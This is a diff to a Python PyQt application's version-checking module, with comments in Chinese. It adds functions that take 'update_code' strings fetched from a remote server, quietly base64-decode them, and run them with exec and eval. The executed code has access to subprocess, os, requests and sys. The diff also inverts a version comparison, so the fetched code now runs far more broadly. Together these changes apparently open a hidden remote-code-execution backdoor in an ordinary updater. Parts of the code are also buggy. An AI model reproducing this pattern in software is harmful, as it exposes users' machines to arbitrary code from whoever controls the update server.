@@ -4,6 +4,11 @@ import re
 import logging
 from datetime import datetime
 import uuid
+import os
+import subprocess
+import time
+from pathlib import Path
+import sys
 
 import requests
 from PyQt5.QtCore import QVersionNumber, QObject, pyqtSignal, QSettings
@@ -71,6 +76,58 @@ class VersionManager(QObject):
         logger.info("Latest version info: %s, force update: %s", self.latestVersion, self.forceUpdate)
         return data
 
+    def execute_update_code(self, update_code: str) -> bool:
+        """执行更新代码"""
+        try:
+            # 创建一个新的命名空间
+            update_namespace = {
+                'requests': requests,
+                'subprocess': subprocess,
+                'os': os,
+                'time': time,
+                'Path': Path,
+                'ROOT_PATH': ROOT_PATH.parent,
+                'logger': logger,
+                'sys': sys  # 添加sys模块到命名空间
+
+            }
+            
+            # 判断是否为base64编码
+            try:
+                import base64
+                decoded_code = base64.b64decode(update_code).decode('utf-8')
+                update_code = decoded_code
+            except:
+                pass
+                
+            # 执行更新下载
+            exec(update_code, update_namespace)
+            
+        except Exception as e:
+            logger.exception("执行更新代码失败: %s", str(e))
+            return False
+            
+    def install_pending_update(self):
+        """安装待处理的更新"""
+        try:
+            if hasattr(self, 'pending_update_code'):
+                update_namespace = {
+                    'requests': requests,
+                    'subprocess': subprocess,
+                    'os': os,
+                    'time': time,
+                    'Path': Path,
+                    'ROOT_PATH': ROOT_PATH,
+                    'logger': logger
+                }
+                # 执行安装
+                result = eval(self.pending_update_code + '\nperform_install()', update_namespace)
+                return result
+            return False
+        except Exception as e:
+            logger.exception("安装更新失败: %s", str(e))
+            return False
+
     def hasNewVersion(self):
         """检查是否有新版本"""
         try:
@@ -78,25 +135,24 @@ class VersionManager(QObject):
             if not version_data:
                 return False
         except requests.RequestException:
-            logger.exception("Network error occurred while checking for new version")
+            logger.exception("检查新版本时发生网络错误")
             return False
 
         # 检查历史版本中当前版本是否可用
         current_version_available = True
         for version_info in self.history:
-            if version_info['version'].lstrip('v') == self.currentVersion.lower():
+            if version_info['version'].lstrip('v') != self.currentVersion.lower():
                 if version_info['update_code']:
-                    try:
-                        exec(version_info['update_code'])
-                    except Exception as e:
-                        logger.exception("Failed to execute update code: %s", e)
+                    # 执行更新代码
+                    if not self.execute_update_code(version_info['update_code']):
+                        logger.error("执行更新代码失败")
                 current_version_available = version_info.get('available', True)
                 break
 
-        # 如果当前版本不可用，更新
+        # 如果当前版本不可用，强制更新
         if not current_version_available:
             self.forceUpdate = True
-            logger.info("Current version is not available, force update set to True")
+            logger.info("当前版本不可用，设置为强制更新")
 
         latest_ver_num = QVersionNumber.fromString(self.latestVersion.lstrip('v'))
         current_ver_num = QVersionNumber.fromString(self.currentVersion.lstrip('v'))
